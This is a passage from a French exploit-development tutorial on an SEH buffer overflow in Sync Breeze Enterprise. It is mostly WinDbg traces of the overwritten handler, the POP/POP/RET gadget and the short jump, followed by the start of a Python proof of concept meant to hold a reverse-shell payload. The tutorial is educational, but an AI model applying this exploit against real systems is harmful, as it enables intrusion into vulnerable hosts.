<a id="__codelineno-51-23" name="__codelineno-51-23" href="#__codelineno-51-23"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">inputBuffer</span>
<a id="__codelineno-51-24" name="__codelineno-51-24" href="#__codelineno-51-24"></a>  <span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="p">(</span><span class="n">cd4</span><span class="p">.</span><span class="n">1814</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libpal</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">41414141</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019efa1c</span> <span class="n">ecx</span><span class="p">=</span><span class="n">019eff18</span> <span class="n">edx</span><span class="p">=</span><span class="n">019ef9d4</span> <span class="n">esi</span><span class="p">=</span><span class="n">019eff18</span> <span class="n">edi</span><span class="p">=</span><span class="n">019efb20</span>
<a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="n">eip</span><span class="p">=</span><span class="n">00862a9d</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef9a8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019efec8</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010202</span>
<a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span><span class="p">:</span>
<a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="n">00862a9d</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="p">+</span><span class="n">24h</span><span class="p">]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">41414165</span><span class="p">=????????</span>
</code></pre></div>
<p>La commande <code>exchain</code> nous affiche bien <code>1015a2f0</code> qui est l'adresse contenant la séquence P/P/R :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>0:009&gt; !exchain
<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>019efe1c: libpal!md5_starts+149fb (008ddf5b)
<a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>019eff54: *** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
<a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>libspp!pcre_exec+16460 (1015a2f0)
<a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>Invalid exception stack at 06eb9090
</code></pre></div>
<p>On positionne de nouveau un point d'arrêt sur cette adresse et on relance l'exécution :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c">#</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x1015a2f0</span>
<a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="c">#</span>
<a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
</code></pre></div>
<p>Le point d'arrêt et atteint et on déroule pas à pas la séquence P/P/R :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c">#</span>
<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="c">#</span>
<a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="nb">r</span>
<a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a><span class="c">#</span>
<a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f1</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef43c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16461</span><span class="p">:</span>
<a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a><span class="n">1015a2f1</span> <span class="n">5b</span>              <span class="n">pop</span>     <span class="n">ebx</span>
<a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a><span class="c">#</span>
<a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019ef540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f2</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef440</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16462</span><span class="p">:</span>
<a id="__codelineno-55-28" name="__codelineno-55-28" href="#__codelineno-55-28"></a><span class="n">1015a2f2</span> <span class="n">c3</span>              <span class="n">ret</span>
</code></pre></div>
<p>On arrive sur les deux instructions <code>NOP</code> qui précèdent le <em>short jump</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c"># 1er NOP (90)</span>
<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019ef540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">019eff54</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="n">019eff54</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="c"># 2em NOP (90)</span>
<a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019ef540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="n">eip</span><span class="p">=</span><span class="n">019eff55</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-56-12" name="__codelineno-56-12" href="#__codelineno-56-12"></a><span class="n">019eff55</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-56-13" name="__codelineno-56-13" href="#__codelineno-56-13"></a><span class="c"># Short JUMP `eb06`</span>
<a id="__codelineno-56-14" name="__codelineno-56-14" href="#__codelineno-56-14"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-56-15" name="__codelineno-56-15" href="#__codelineno-56-15"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019ef540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-56-16" name="__codelineno-56-16" href="#__codelineno-56-16"></a><span class="n">eip</span><span class="p">=</span><span class="n">019eff56</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-56-17" name="__codelineno-56-17" href="#__codelineno-56-17"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-56-18" name="__codelineno-56-18" href="#__codelineno-56-18"></a><span class="n">019eff56</span> <span class="n">eb06</span>            <span class="n">jmp</span>     <span class="n">019eff5e</span>
</code></pre></div>
<p>Après exécution du <em>short jump</em> on est dans notre <em>payload</em> juste après le SEH :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">019eff5e</span> <span class="p">-</span> <span class="n">0x06</span>
<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="n">019eff58</span>  <span class="n">1015a2f0</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="n">019eff68</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="n">019eff78</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="n">019eff88</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="n">019eff98</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="n">019effa8</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="n">019effb8</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="n">019effc8</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
</code></pre></div>
<p>Si on affiche plus en détail le <em>payload</em> on se rend compte qu'il est tronqué et proche du début de la pile :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="p">[...]</span>
<a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019ef540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">019eff56</span> <span class="n">esp</span><span class="p">=</span><span class="n">019ef444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019ef458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="n">019eff56</span> <span class="n">eb06</span>            <span class="n">jmp</span>     <span class="n">019eff5e</span>
<a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="c">#</span>
<a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">eip</span> <span class="n">L30</span>
<a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="n">019eff56</span>  <span class="n">a2f006eb</span> <span class="n">43431015</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="n">019eff66</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="n">019eff76</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="n">019eff86</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-12" name="__codelineno-58-12" href="#__codelineno-58-12"></a><span class="n">019eff96</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-13" name="__codelineno-58-13" href="#__codelineno-58-13"></a><span class="n">019effa6</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-14" name="__codelineno-58-14" href="#__codelineno-58-14"></a><span class="n">019effb6</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-15" name="__codelineno-58-15" href="#__codelineno-58-15"></a><span class="n">019effc6</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-58-16" name="__codelineno-58-16" href="#__codelineno-58-16"></a><span class="n">019effd6</span>  <span class="n">43434343</span> <span class="n">ff004343</span> <span class="n">2910019e</span> <span class="n">ffff7781</span>
<a id="__codelineno-58-17" name="__codelineno-58-17" href="#__codelineno-58-17"></a><span class="n">019effe6</span>  <span class="n">3c67ffff</span> <span class="n">00007785</span> <span class="n">00000000</span> <span class="n">3e100000</span>
<a id="__codelineno-58-18" name="__codelineno-58-18" href="#__codelineno-58-18"></a><span class="n">019efff6</span>  <span class="n">65480089</span> <span class="n">000000dc</span> <span class="p">????????</span> <span class="p">????????</span>
<a id="__codelineno-58-19" name="__codelineno-58-19" href="#__codelineno-58-19"></a><span class="n">019f0006</span>  <span class="p">????????</span> <span class="p">????????</span> <span class="p">????????</span> <span class="p">????????</span>
<a id="__codelineno-58-20" name="__codelineno-58-20" href="#__codelineno-58-20"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-58-21" name="__codelineno-58-21" href="#__codelineno-58-21"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">002b2000</span>
<a id="__codelineno-58-22" name="__codelineno-58-22" href="#__codelineno-58-22"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">019ef44c</span>
<a id="__codelineno-58-23" name="__codelineno-58-23" href="#__codelineno-58-23"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">019f0000</span>                <span class="c"># Début de la stack</span>
<a id="__codelineno-58-24" name="__codelineno-58-24" href="#__codelineno-58-24"></a><span class="p">[...]</span>
</code></pre></div>
<p>Il n'y a pas assez d'espace ici pour stocker un <em>reverse shell</em> Meterpreter.</p>
<p>La preuve de concept envoie près de 1000 octets qui ne sont pas présents à cet endroit là. On veut identifier l'espace en mémoire où ils sont stockés pour y <em>jump</em> et y stocker le <em>shellcode</em>.</p>
<p>On modifie la preuve de concept de façon à stocker le futur <em>shellcode</em> dans une variable distincte avec un contenu facilement identifiable :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c">#!/usr/bin/python</span>
<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="n">import</span> <span class="n">socket</span>
<a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="n">import</span> <span class="n">sys</span>
<a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="n">from</span> <span class="n">struct</span> <span class="n">import</span> <span class="n">pack</span>
<a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>
<a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>  <span class="n">server</span> <span class="p">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="n">1</span><span class="p">]</span>
<a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>  <span class="n">port</span> <span class="p">=</span> <span class="n">9121</span>
